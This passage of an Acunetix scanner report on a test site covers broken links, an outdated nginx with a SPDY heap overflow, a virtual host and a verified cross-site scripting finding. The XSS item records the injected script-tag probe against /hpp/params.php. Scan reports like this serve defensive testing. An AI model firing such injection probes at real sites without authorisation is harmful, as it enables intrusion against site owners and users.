Date: Thu, 14 Jul 2016 00:49:59 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 383
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="14" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop/Details/color-printer/3]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/Details/color-printer/3/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:06 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="15" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop/Details/web-camera-a4tech/2]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:06 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="16" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:06 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 570
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="17" color="red">
       <Name><![CDATA[nginx SPDY heap buffer overflow]]></Name>
       <ModuleName><![CDATA[Scripting (Version_Check.script)]]></ModuleName>
       <Details><![CDATA[Current version is : <font color="dark">nginx/1.4.1</font>]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[An attacker can cause a heap memory buffer overflow in a worker process by using a specially crafted request, potentially
resulting in arbitrary code execution ]]></Impact>
       <Description><![CDATA[A heap-based buffer overflow in the SPDY implementation in nginx 1.3.15 before 1.4.7 and 1.5.x before 1.5.12 allows remote attackers to execute arbitrary code via a crafted request. The problem affects nginx compiled with the ngx_http_spdy_module module (which is not compiled by default) and without --with-debug configure option, if the &quot;spdy&quot; option of the &quot;listen&quot; directive is used in a configuration file.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Upgrade nginx to the latest version of apply the patch provided by the vendor.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[]]></Request>
        <Response><![CDATA[]]></Response>
       </TechnicalDetails>
       <CWE id="122"><![CDATA[CWE-122]]></CWE>
       <CVEList>
        <CVE>
          <Id><![CDATA[CVE-2014-0133]]></Id>
        </CVE>
       </CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:P/I:P/A:P/E:POC/RL:OF]]></Descriptor>
          <Score><![CDATA[5.1]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[Proof of concept code]]></E>
          <Edesc><![CDATA[Proof-of-concept exploit code or an attack demonstration that is not practical for most systems is available. The code or technique is not functional in all situations and may require substantial modification by a skilled attacker.]]></Edesc>
          <RL><![CDATA[Official fix]]></RL>
          <RLdesc><![CDATA[A complete vendor solution is available. Either the vendor has issued an official patch, or an upgrade is available.]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[nginx security advisory (CVE-2014-0133)]]></Database>
          <URL><![CDATA[http://mailman.nginx.org/pipermail/nginx-announce/2014/000135.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[nginx patch]]></Database>
          <URL><![CDATA[http://nginx.org/download/patch.2014.spdy2.txt]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="18" color="blue">
       <Name><![CDATA[Possible virtual host found]]></Name>
       <ModuleName><![CDATA[Scripting (VirtualHost_Audit.script)]]></ModuleName>
       <Details><![CDATA[VirtualHost: <font color="dark"><b>localhost</b></font><br/>Response: <pre wrap="virtual"><font color="blue">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
&lt;style&gt;
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
&lt;p&gt;If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.&lt;/p&gt;

&lt;p&gt;For online documentation and support please refer to
&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;
Commercial support is available at
&lt;a href</font></pre>]]></Details>
       <Affects><![CDATA[localhost]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). This allows one server to share its resources, such as memory and processor cycles, without requiring all services provided to use the same host name. <br/><br/>
This web server is responding differently when the Host header is manipulated and various common virtual hosts are tested. This could indicate there is a Virtual Host present.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Consult the virtual host configuration and check if this virtual host should be publicly accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Host: localhost
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:10 GMT
Content-Type: text/html
Last-Modified: Mon, 06 May 2013 11:30:13 GMT
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 612
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Virtual hosting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Virtual_hosting]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="19" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">p</font></b> was set to <b><font color="dark">valid'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;bfcg(9771)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[p]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

